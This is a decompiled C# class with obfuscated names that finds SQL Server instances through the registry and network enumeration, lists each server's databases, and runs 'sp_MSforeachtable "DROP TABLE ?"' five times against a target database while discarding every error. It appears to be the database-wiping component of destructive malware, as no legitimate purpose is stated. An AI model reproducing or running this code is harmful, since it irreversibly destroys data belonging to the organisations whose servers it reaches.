using System;
using System.Collections.Generic;
using System.Data;
using System.Data.Common;
using System.Data.Sql;
using System.Data.SqlClient;
using Microsoft.Win32;

namespace ns5;

internal sealed class Class32
{
	private static readonly string string_0 = "Data Source={0};Initial Catalog=Master;Integrated Security=True;Connect Timeout=20";

	private static readonly string string_1 = "Data Source={0};Initial Catalog={1};Integrated Security=True;Connect Timeout=20";

	public static void smethod_0(string string_2, string string_3)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		SqlConnection val = new SqlConnection(string.Format(string_1, string_2, string_3));
		try
		{
			((DbConnection)(object)val).Open();
			for (int i = 0; i < 5; i++)
			{
				try
				{
					SqlCommand val2 = val.CreateCommand();
					try
					{
						((DbCommand)(object)val2).CommandText = "exec sp_MSforeachtable \"DROP TABLE ? \" ";
						((DbCommand)(object)val2).ExecuteNonQuery();
					}
					finally
					{
						((IDisposable)val2)?.Dispose();
					}
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static List<string> smethod_1(string string_2)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		List<string> list = new List<string>();
		SqlConnection val = new SqlConnection(string.Format(string_0, string_2));
		try
		{
			((DbConnection)(object)val).Open();
			SqlCommand val2 = val.CreateCommand();
			try
			{
				((DbCommand)(object)val2).CommandText = "SELECT name FROM sysdatabases ORDER BY dbid DESC ";
				SqlDataReader val3 = val2.ExecuteReader(CommandBehavior.CloseConnection);
				try
				{
					while (((DbDataReader)(object)val3).Read())
					{
						try
						{
							list.Add(((DbDataReader)(object)val3).GetString(0));
						}
						catch
						{
						}
					}
					((DbDataReader)(object)val3).Close();
					return list;
				}
				finally
				{
					((IDisposable)val3)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch (Exception)
		{
			return list;
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static bool smethod_2(string string_2)
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		if (string.IsNullOrEmpty(string_2))
		{
			return false;
		}
		SqlConnection val = new SqlConnection(string.Format(string_0, string_2));
		try
		{
			((DbConnection)(object)val).Open();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static List<string> smethod_3()
	{
		List<string> list = smethod_5();
		List<string> list2 = smethod_4();
		foreach (string item in list2)
		{
			if (!list.Contains(item))
			{
				list.Add(item);
			}
		}
		return list;
	}

	public static List<string> smethod_4()
	{
		List<string> list = new List<string>();
		try
		{
			SqlDataSourceEnumerator instance = SqlDataSourceEnumerator.get_Instance();
			DataTable dataSources = ((DbDataSourceEnumerator)(object)instance).GetDataSources();
			foreach (DataRow row in dataSources.Rows)
			{
				object obj = row["ServerName"];
				object obj2 = row["InstanceName"];
				if (obj2 != null && obj2 != DBNull.Value)
				{
					list.Add(string.Concat(obj, "\\", obj2));
				}
				else
				{
					list.Add(obj.ToString());
				}
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	public static List<string> smethod_5()
	{
		List<string> list = smethod_6();
		list.Add(Environment.MachineName);
		return list;
	}

	private static List<string> smethod_6()
	{
		string machineName = Environment.MachineName;
		List<string> list = new List<string>();
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Microsoft SQL Server\\Instance Names");
			try
			{
				string[] subKeyNames = registryKey.GetSubKeyNames();
				foreach (string name in subKeyNames)
				{
					RegistryKey registryKey2 = registryKey.OpenSubKey(name);
					string[] valueNames = registryKey2.GetValueNames();
					foreach (string text in valueNames)
					{
						if (!string.IsNullOrEmpty(text))
						{
							list.Add(machineName + "\\" + text);
						}
					}
				}
				return list;
			}
			finally
			{
				registryKey.Close();
			}
		}
		catch (Exception)
		{
			return list;
		}
	}
}
